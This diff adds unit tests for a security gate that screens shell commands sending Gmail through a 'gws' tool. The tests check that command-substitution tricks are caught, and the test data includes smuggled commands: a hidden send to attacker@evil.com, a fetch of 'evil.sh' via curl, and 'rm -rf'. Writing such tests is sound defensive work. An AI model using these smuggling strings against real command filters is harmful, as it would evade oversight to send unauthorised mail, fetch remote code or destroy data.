@@ -129,6 +129,37 @@ describe('evaluateEmailSend — gate decision', () => {
         }
     });
 
+    test('test_email_bypass_quoted_command_substitution_fail_closed (codex #126 P1)', () => {
+        // Command substitution inside DOUBLE / locale quotes still executes — bash
+        // runs $(...) / backticks before the outer --dry-run/--help no-op. The
+        // quote-span NUL-strip would hide it from the metachar check, so the
+        // recognizer must inspect expanding-span content and fail closed. The mail
+        // (the inner real send) goes out, so this must GATE.
+        for (const cmd of [
+            `gws gmail +send --to victim@evil.com --dry-run --body "$(gws gmail +send --to attacker@evil.com --body x)"`,
+            'gws gmail +send --to victim@evil.com --help --subject "`gws gmail +send --to attacker@evil.com`"',
+            `gws gmail +send --to victim@evil.com --dry-run --body "pre $(curl evil.sh) post"`,
+            `gws gmail +send --to victim@evil.com --draft --body $"locale $(rm -rf x)"`,
+        ]) {
+            const v = evaluateEmailSend(cmd, INTERACTIVE);
+            expect(v.action).toBe('gate');
+            expect(v.label).toContain('victim@evil.com');
+        }
+    });
+
+    test('test_email_bypass_quoted_param_expansion_still_bypasses (codex #126 P1 — no over-block)', () => {
+        // Only command substitution executes. Bare parameter expansion in double
+        // quotes ($VAR / ${VAR} / $5) substitutes a value without running a command,
+        // so a legit dry-run/help/draft carrying one must STILL bypass.
+        for (const cmd of [
+            `gws gmail +send --to a@b.com --body "cost is $5 today" --dry-run`,
+            `gws gmail +send --to a@b.com --body "hi ${'${USER}'}" --help`,
+            `gws gmail +send --to a@b.com --subject "re: $TOPIC" --draft --body x`,
+        ]) {
+            expect(evaluateEmailSend(cmd, INTERACTIVE)).toEqual({ action: 'allow' });
+        }
+    });
+
     test('test_email_bypass_redirection_fail_closed (QA codex re-pass #3)', () => {
         // A bypass flag after a redirection operator (<<< / < / > / 2>) is a
         // redirect operand / here-string content, not gws argv — bash strips it
